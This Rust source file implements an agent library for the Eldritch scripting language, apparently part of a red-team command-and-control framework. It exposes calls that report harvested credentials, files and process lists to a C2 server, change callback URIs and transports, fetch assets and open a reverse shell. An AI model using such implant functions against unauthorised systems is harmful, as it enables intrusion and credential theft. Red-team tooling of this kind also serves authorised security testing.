use super::AgentLibrary;
use alloc::collections::BTreeMap;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use eldritch_core::{Interpreter, Value};
use eldritch_macros::eldritch_library_impl;

use crate::{CredentialWrapper, FileWrapper, ProcessListWrapper, TaskWrapper};

#[cfg(feature = "stdlib")]
use crate::agent::Agent;
#[cfg(feature = "stdlib")]
use pb::c2;

// We need manual Debug impl, and we need to put the macro on the struct.
#[eldritch_library_impl(AgentLibrary)]
pub struct StdAgentLibrary {
    pub agent: Arc<dyn Agent>,
    pub task_id: i64,
}

impl core::fmt::Debug for StdAgentLibrary {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("StdAgentLibrary")
            .field("task_id", &self.task_id)
            .finish()
    }
}

impl StdAgentLibrary {
    pub fn new(agent: Arc<dyn Agent>, task_id: i64) -> Self {
        Self { agent, task_id }
    }
}

impl AgentLibrary for StdAgentLibrary {
    fn get_config(&self) -> Result<BTreeMap<String, Value>, String> {
        let config = self.agent.get_config()?;
        let mut result = BTreeMap::new();
        for (k, v) in config {
            // Try to parse numbers, otherwise keep as string
            if let Ok(i) = v.parse::<i64>() {
                result.insert(k, Value::Int(i));
            } else if let Ok(b) = v.parse::<bool>() {
                result.insert(k, Value::Bool(b));
            } else {
                result.insert(k, Value::String(v));
            }
        }
        Ok(result)
    }

    fn get_id(&self) -> Result<String, String> {
        Err("get_id not implemented".to_string())
    }

    fn get_platform(&self) -> Result<String, String> {
        Err("get_platform not implemented".to_string())
    }

    fn _terminate_this_process_clowntown(&self) -> Result<(), String> {
        ::std::process::exit(0);
    }

    fn set_config(&self, _config: BTreeMap<String, Value>) -> Result<(), String> {
        Err("set_config not implemented".to_string())
    }

    fn sleep(&self, secs: i64) -> Result<(), String> {
        ::std::thread::sleep(::std::time::Duration::from_secs(secs as u64));
        Ok(())
    }

    fn set_callback_interval(&self, interval: i64) -> Result<(), String> {
        self.agent.set_callback_interval(interval as u64)
    }

    fn set_callback_uri(&self, uri: String) -> Result<(), String> {
        self.agent.set_callback_uri(uri)
    }

    // Interactivity
    fn fetch_asset(&self, name: String) -> Result<Vec<u8>, String> {
        let req = c2::FetchAssetRequest { name };
        self.agent.fetch_asset(req)
    }

    fn report_credential(&self, credential: CredentialWrapper) -> Result<(), String> {
        let req = c2::ReportCredentialRequest {
            task_id: self.task_id,
            credential: Some(credential.0),
        };
        self.agent.report_credential(req).map(|_| ())
    }

    fn report_file(&self, file: FileWrapper) -> Result<(), String> {
        let req = c2::ReportFileRequest {
            task_id: self.task_id,
            chunk: Some(file.0),
        };
        self.agent.report_file(req).map(|_| ())
    }

    fn report_process_list(&self, list: ProcessListWrapper) -> Result<(), String> {
        let req = c2::ReportProcessListRequest {
            task_id: self.task_id,
            list: Some(list.0),
        };
        self.agent.report_process_list(req).map(|_| ())
    }

    fn report_task_output(&self, output: String, error: Option<String>) -> Result<(), String> {
        let task_error = error.map(|msg| c2::TaskError { msg });
        let output_msg = c2::TaskOutput {
            id: self.task_id,
            output,
            error: task_error,
            exec_started_at: None,
            exec_finished_at: None,
        };
        let req = c2::ReportTaskOutputRequest {
            output: Some(output_msg),
        };
        self.agent.report_task_output(req).map(|_| ())
    }

    fn reverse_shell(&self) -> Result<(), String> {
        self.agent.reverse_shell()
    }

    fn claim_tasks(&self) -> Result<Vec<TaskWrapper>, String> {
        let req = c2::ClaimTasksRequest { beacon: None };
        let resp = self.agent.claim_tasks(req)?;
        Ok(resp.tasks.into_iter().map(TaskWrapper).collect())
    }

    // Agent Configuration
    fn get_transport(&self) -> Result<String, String> {
        self.agent.get_transport()
    }

    fn set_transport(&self, transport: String) -> Result<(), String> {
        self.agent.set_transport(transport)
    }

    fn add_transport(&self, transport: String, config: String) -> Result<(), String> {
        self.agent.add_transport(transport, config)
    }

    fn list_transports(&self) -> Result<Vec<String>, String> {
        self.agent.list_transports()
    }

    fn get_callback_interval(&self) -> Result<i64, String> {
        self.agent.get_callback_interval().map(|i| i as i64)
    }

    // Task Management
    fn list_tasks(&self) -> Result<Vec<TaskWrapper>, String> {
        let tasks = self.agent.list_tasks()?;
        Ok(tasks.into_iter().map(TaskWrapper).collect())
    }

    fn stop_task(&self, task_id: i64) -> Result<(), String> {
        self.agent.stop_task(task_id)
    }

    fn eval(&self, code: String) -> Result<Value, String> {
        let mut interp = Interpreter::new();
        // Register a new StdAgentLibrary instance to allow recursion
        let lib = StdAgentLibrary::new(self.agent.clone(), self.task_id);
        interp.register_lib(lib);
        interp.interpret(&code)
    }
}
